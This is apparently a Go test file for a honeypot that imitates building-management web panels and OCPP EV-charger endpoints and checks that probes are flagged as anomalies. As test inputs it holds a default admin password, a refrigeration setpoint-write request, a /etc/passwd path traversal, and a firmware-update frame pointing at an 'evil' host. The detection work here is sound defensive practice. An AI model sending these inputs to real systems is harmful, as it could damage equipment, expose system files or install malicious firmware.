package handler

import (
	"bufio"
	"context"
	"strings"
	"testing"
	"time"

	"github.com/rom/tarpit-honeypot/internal/config"
)

func TestDixellDefaultCred(t *testing.T) {
	body := "username=admin&password=dixell"
	res, reply := runHTTPish(t, &bmsWeb{kind: "dixell"}, httpPost("/login", "application/x-www-form-urlencoded", body))
	if !strings.Contains(reply, "XWEB500") {
		t.Errorf("dixell fingerprint missing: %q", reply)
	}
	for _, w := range []string{"dixell-probe", "bms-web-probe", "dixell-login-attempt", "bms-default-cred"} {
		if !containsStr(anoms(res), w) {
			t.Errorf("anomalies=%v want %q", anoms(res), w)
		}
	}
}

func TestBMSSetpointWriteAndTraversal(t *testing.T) {
	res, _ := runHTTPish(t, &bmsWeb{kind: "carel"}, "GET /set?setpoint=-40&defrost=now HTTP/1.1\r\nHost: x\r\n\r\n")
	if !containsStr(anoms(res), "refrigeration-setpoint-write") {
		t.Errorf("anomalies=%v want refrigeration-setpoint-write", anoms(res))
	}
	res, _ = runHTTPish(t, &bmsWeb{kind: "trane"}, "GET /../../etc/passwd HTTP/1.1\r\nHost: x\r\n\r\n")
	if !containsStr(anoms(res), "bms-web-traversal") {
		t.Errorf("anomalies=%v want bms-web-traversal", anoms(res))
	}
}

// runOCPP drives the OCPP handler through a real WebSocket upgrade and then
// sends one masked OCPP-J CALL frame, returning the Result.
func runOCPP(t *testing.T, path, subproto, ocppFrame string) Result {
	t.Helper()
	client, server := pipePair(t)
	cfg := config.Listener{Handler: "ocpp", ReadTimeout: time.Second}
	done := make(chan struct{})
	var res Result
	go func() {
		defer close(done)
		res, _ = (&ocppH{}).Handle(context.Background(), server, cfg)
	}()
	req := "GET " + path + " HTTP/1.1\r\nHost: cs\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n" +
		"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\n" +
		"Sec-WebSocket-Protocol: " + subproto + "\r\n\r\n"
	_, _ = client.Write([]byte(req))
	// read the 101 handshake response
	brc := bufio.NewReader(client)
	for {
		line, err := brc.ReadString('\n')
		if err != nil || line == "\r\n" {
			break
		}
	}
	if ocppFrame != "" {
		_, _ = client.Write(maskedWSTextFrame(ocppFrame))
	}
	client.Close()
	<-done
	return res
}

// maskedWSTextFrame builds a client->server masked text frame (opcode 0x1).
func maskedWSTextFrame(payload string) []byte {
	p := []byte(payload)
	mask := []byte{0x01, 0x02, 0x03, 0x04}
	out := []byte{0x81}
	n := len(p)
	switch {
	case n < 126:
		out = append(out, byte(0x80|n))
	default:
		out = append(out, 0x80|126, byte(n>>8), byte(n))
	}
	out = append(out, mask...)
	for i, b := range p {
		out = append(out, b^mask[i%4])
	}
	return out
}

func TestOCPPConnectAndRemoteStart(t *testing.T) {
	frame := `[2,"uid-1","RemoteStartTransaction",{"idTag":"ABCDEF","connectorId":1}]`
	res := runOCPP(t, "/CP_SIM_0001", "ocpp1.6", frame)
	for _, w := range []string{"ocpp-connect", "ocpp-message", "ocpp-remote-transaction"} {
		if !containsStr(anoms(res), w) {
			t.Errorf("anomalies=%v want %q", anoms(res), w)
		}
	}
	if res.Meta["ocpp_charge_point"] != "CP_SIM_0001" {
		t.Errorf("ocpp_charge_point=%v want CP_SIM_0001", res.Meta["ocpp_charge_point"])
	}
	if res.Meta["ocpp_subprotocol"] != "ocpp1.6" {
		t.Errorf("ocpp_subprotocol=%v", res.Meta["ocpp_subprotocol"])
	}
}

func TestOCPPFirmwareUpdate(t *testing.T) {
	frame := `[2,"uid-2","UpdateFirmware",{"location":"http://evil/fw.bin","retrieveDate":"2026-01-01T00:00:00Z"}]`
	res := runOCPP(t, "/charger7", "ocpp2.0.1", frame)
	if !containsStr(anoms(res), "ocpp-firmware-update") {
		t.Errorf("anomalies=%v want ocpp-firmware-update", anoms(res))
	}
}

func TestOCPPActionParse(t *testing.T) {
	if a := ocppAction(`[2,"id","BootNotification",{}]`); a != "BootNotification" {
		t.Errorf("ocppAction=%q want BootNotification", a)
	}
	if a := ocppAction(`not json`); a != "" {
		t.Errorf("ocppAction on junk=%q want empty", a)
	}
}
